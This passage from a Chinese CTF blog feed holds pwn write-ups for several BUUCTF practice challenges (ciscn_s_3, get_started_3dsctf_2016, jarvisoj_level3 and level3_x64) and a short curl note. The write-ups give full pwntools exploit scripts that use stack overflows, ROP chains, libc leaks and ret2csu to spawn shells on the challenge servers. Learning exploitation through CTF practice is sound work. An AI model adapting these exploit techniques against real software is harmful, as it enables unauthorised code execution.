<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>s<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>第一个’aaaa‘随便输入，如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节<br>接着跟上system函数的地址<br>后面是执行完system函数后的返回地址，这边也可以随便写<br>之后是一个地址，这个地址指向的是我们写在栈上的’/bin/sh‘字符串</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload2<span class="token operator">=</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span>）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload2<span class="token operator">+=</span>p32<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27757</span><span class="token punctuation">)</span>

sys<span class="token operator">=</span><span class="token number">0x8048400</span>
leave_ret<span class="token operator">=</span><span class="token number">0x08048562</span>
main<span class="token operator">=</span><span class="token number">0xdeadbeef</span>

payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x27</span><span class="token operator">+</span><span class="token string">b'b'</span>
r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span>
s<span class="token operator">=</span>ebp<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x38</span>

payload2<span class="token operator">=</span><span class="token string">b'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>s<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh"</span>
payload2<span class="token operator">=</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>
payload2<span class="token operator">+=</span>p32<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>


r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>cat flag</p>
<p><img src="/img/image-20210628221613459.png" alt="image-20210628221613459"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_s_3</title>
    <url>/2021/0628742.html</url>
    <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png" alt="image-20210628173000858"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
<p><img src="/img/image-20210628173110722.png" alt="image-20210628173110722"></p>
<p>再查看vuln函数，一个sys_read,一个sys_write,写入0x400，读0x30，这里就发现栈溢出的漏洞</p>
<p><img src="/img/image-20210628173134218.png" alt="image-20210628173134218"></p>
<p>然后又发现了一个gadget函数</p>
<p><img src="/img/image-20210628173525340.png" alt="image-20210628173525340"></p>
<p><img src="/img/image-20210628174307696.png" alt="image-20210628174307696"></p>
<h3 id="这里要注意："><a href="#这里要注意：" class="headerlink" title="这里要注意："></a>这里要注意：</h3><p>  mov      rax, 15       sys_rt_sigreturn</p>
<p>  mov      rax, 59       sys_execve</p>
<p>gadget函数没有被直接调用，该函数设置了rax=15并返回，推测可能和系统调用号有关。查到ubuntu18 64位系统调用号15为<strong>rt_sigreturn</strong>，用于恢复从用户态进入内核态所保存的上下文（即寄存器信息），59为<strong>execve</strong>，作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p>
<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
<p><img src="/img/image-20210628175901200.png" alt="image-20210628175901200"></p>
<p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28640</span><span class="token punctuation">)</span>
<span class="token comment">#io=process('./ciscn_s_3')</span>
main<span class="token operator">=</span><span class="token number">0x0004004ED</span>
execve<span class="token operator">=</span><span class="token number">0x04004E2</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x4005a3</span>
pop_rbx_rbp_r12_r13_r14_r15<span class="token operator">=</span><span class="token number">0x40059A</span>
mov_rdxr13_call<span class="token operator">=</span><span class="token number">0x0400580</span> 
sys<span class="token operator">=</span><span class="token number">0x00400517</span>

payload1<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">280</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rbx_rbp_r12_r13_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>mov_rdxr13_call<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>
payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>cat flag!</p>
<p><img src="/img/image-20210628181623724.png"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CURL</title>
    <url>/2021/0617139.html</url>
    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>

<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>get_started_3dsctf_2016</title>
    <url>/2021/06173df8.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>查看保护机制，32位，开了NX</p>
<p><img src="/img/image-20210425011728468.png"></p>
<p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p>
<p><img src="/img/image-20210425011933854.png"></p>
<p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p>
<p><img src="/img/image-20210425012146370.png"></p>
<p>点击a1查看到了在栈中的位置</p>
<p><img src="/img/image-20210425012353464.png"></p>
<p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p>
<p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p>
<p><img src="/img/image-20210425012826978.png"></p>
<p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p>
<p><img src="/img/image-20210425013007535.png"></p>
<p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p>
<p><img src="/img/image-20210425013149728.png"></p>
<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./get_started_3dsctf_2016'</span><span class="token punctuation">)</span>
<span class="token comment">#r = remote("node3.buuoj.cn" , 26419)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80489B8</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是没办法得到flag，这里还发现这样远程是无法连接的</p>
<p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p>
<p><img src="/img/image-20210425162841539.png"></p>
<h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26419</span><span class="token punctuation">)</span>
<span class="token comment">#r = process('./get_started_3dsctf_2016')</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

get_addr <span class="token operator">=</span> <span class="token number">0x080489A0</span>
exit_addr <span class="token operator">=</span> <span class="token number">0x0804E6A0</span>

a1 <span class="token operator">=</span> <span class="token number">814536271</span>
a2 <span class="token operator">=</span> <span class="token number">425138641</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a2<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/image-20210425165227769.png"></p>
<p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_level3</title>
    <url>/2021/0628b4bb.html</url>
    <content><![CDATA[<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210628222619420.png" alt="image-20210628222619420"></p>
<p>IDA打开，shift+F12没有找到system和’/bin/sh’，所以应该也是libc泄露</p>
<p>查看main函数，又看到了熟悉的vulnerable_function()函数</p>
<p><img src="/img/image-20210628222739706.png" alt="image-20210628222739706"></p>
<p><img src="/img/image-20210628222833493.png" alt="image-20210628222833493"></p>
<p>果然漏洞就在这个函数里</p>
<p>写入长度只有7，而读的长度有0x100，漏洞很大</p>
<p>解题思路和前几个题都类似了</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.通过write函数泄露libc版本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>

payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input:\n'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
write_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>2.计算libc基址，算出system和/bin/sh的地址</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>
system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>3.构造rop，执行system(‘/bin/sh’)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input:\n'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from LibcSearcher import *</span>

r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28991</span><span class="token punctuation">)</span>
<span class="token comment">#r=process('./level3')</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>

main<span class="token operator">=</span><span class="token number">0x804844B</span>
write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>

payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input:\n'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
write_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>
<span class="token comment">#libc=LibcSearcher('write',write_addr)</span>
libc_base<span class="token operator">=</span>write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
sh<span class="token operator">=</span>libc_base<span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input:\n'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>cat flag</p>
<p><img src="/img/image-20210706133135129.png" alt="image-20210706133135129"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_level3_x64</title>
    <url>/2021/0711b8e0.html</url>
    <content><![CDATA[<h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210711122341042.png" alt="image-20210711122341042"></p>
<p>IDA打开，</p>
<p>main函数</p>
<p><img src="/img/image-20210711123946252.png" alt="image-20210711123946252"></p>
<p>发现function函数，找到栈溢出漏洞</p>
<p><img src="/img/image-20210711124005975.png" alt="image-20210711124005975"></p>
<p>写入长度为7，读的长度为0x200</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.泄露read地址得到libc版本</p>
<p>2.获取system和‘/bin/sh’的地址</p>
<p>3.返回主函数进行夺权</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>因为是64位，所以考虑寄存器问题</p>
<p>需要构造write(1, read_got, 8)，即将rdi=1<code>，</code>rsi=read_got<code>，</code>rdx=8</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary level3_x64 <span class="token operator">-</span><span class="token operator">-</span>only “pop<span class="token operator">|</span>ret”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/image-20210711132937061.png" alt="image-20210711132937061"></p>
<p>利用出栈指令<code>pop</code>给对应的寄存器赋值，但这里没有<code>pop rdx</code>，通过查看反汇编可以发现构造栈溢出前<code>rdx=0x200</code>，足够将<code>read</code>函数的真实地址泄露出来</p>
<p>第二次栈溢出跳转执行<code>system(&quot;/bin/sh&quot;)</code></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">29641</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level3_x64"</span><span class="token punctuation">)</span>

read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4006b3</span>
pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x4006b1</span>

payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x88</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>						<span class="token comment">#设置write第一个参数为1</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>	<span class="token comment">#设置write第二个参数为read_got</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>									<span class="token comment">#调用write函数</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>									<span class="token comment">#调用完write返回主函数</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment">#接收泄露的read函数的真实地址</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span> read_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> read_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x88</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
